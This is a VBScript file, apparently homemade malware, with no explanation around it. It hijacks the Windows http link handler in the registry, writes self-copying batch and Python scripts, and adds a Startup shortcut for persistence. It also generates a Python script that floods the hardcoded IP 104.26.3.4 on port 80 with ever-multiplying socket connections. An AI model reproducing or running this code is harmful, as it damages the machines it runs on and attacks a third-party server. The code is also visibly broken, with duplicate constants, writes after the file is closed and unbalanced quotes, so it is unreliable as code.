Set objFSO = CreateObject("Scripting.FileSystemObject")

Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
 strComputer & "\root\default:StdRegProv")
strKeyPath = "Software\Classes\http\shell\open\command"
strValueName = "(Default)"
strValue = """Plorg.vbs"" ""%1"""
oReg.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue

Set objTextFile = objFSO.CreateTextFile("C:\Plorg\xer.bat", True)
Set write = objTextFile.WriteLine
write("@echo off")
write("title Porg thumb up yay %random%%random%%random%%random%")
write("set self=%~n0")
write("TYPE %self%.bat > %self%uwu.bat")
write("start %self%uwu.bat")
objTextFile.Close

Set WshShell = WScript.CreateObject("WScript.Shell")

Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
 strComputer & "\root\default:StdRegProv")
strKeyPath = "Software\Classes\http\shell\open\command"
strValueName = "(Default)"
strValue = """C:\Plorg\xer.bat"" ""%1"""
oReg.SetExpandedStringValue HKEY_CURRENT_USER, strKeyPath, strValueName, strValue

ProgramName = "C:\Plorg\xer.bat"
WshShell.Run ProgramName, 0, True

write("echo import shutil >> %self%XD.py")
write("echo import os >> %self%XD.py")
write("echo shutil.copy(os.path.abspath(__file__), os.path.join(os.path.dirname(os.path.abspath(__file__)), "copy.bat")) >> %self%XD.py"
write("echo os.startfile("copy.bat") >> %self%XD.py")

write("python %self%XD.py")

write("echo XD")
objTextFile.Close

ProgramName = "XD.py"
WshShell.Run ProgramName, 0, True

write("echo import socket >> %self%X3.py")
write("echo. >> %self%X3.py")
write("echo IP = "104.26.3.4" >> %self%X3.py")
write("echo PORT = 80 >> %self%X3.py")
write("echo CONNECTIONS = 1000 >> %self%X3.py")
write("echo MESSAGE = "i hate the satan >:(" >> %self%X3.py")
write("echo. >> %self%X3.py")
write("echo connections = [] >> %self%X3.py")
write("echo. >> %self%X3.py")
write("echo for i in range(CONNECTIONS): >> %self%X3.py")
write("echo     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) >> %self%X3.py")
write("echo     server_address = (IP, PORT) >> %self%X3.py")
write("echo     sock.connect(server_address) >> %self%X3.py")
write("echo     connections.append(sock) >> %self%X3.py")
write("echo  >> %self%X3.py")
write("echo while True: >> %self%X3.py")
write("echo     for i in range(len(connections)): >> %self%X3.py")
write("echo         sock = connections[i] >> %self%X3.py")
write("echo         sock.sendall(MESSAGE.encode()) >> %self%X3.py")
write("echo         new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) >> %self%X3.py")
write("echo         new_sock.connect(server_address) >> %self%X3.py")
write("echo         connections.append(new_sock) >> %self%X3.py")
write("echo     print("Number of connections:", len(connections)) >> %self%X3.py")

write("python %self%X3.py")")
objTextFile.Close

ProgramName = "C:\Plorg\xer.bat"
WshShell.Run ProgramName, 0, True

Set objShell = CreateObject("WScript.Shell")

strDesktop = objShell.SpecialFolders("Startup")
strLinkFile = strDesktop & "\Program.lnk"
Set objLink = objShell.CreateShortcut(strLinkFile)
objLink.TargetPath = "C:\Plorg\xer.bat"
objLink.Save
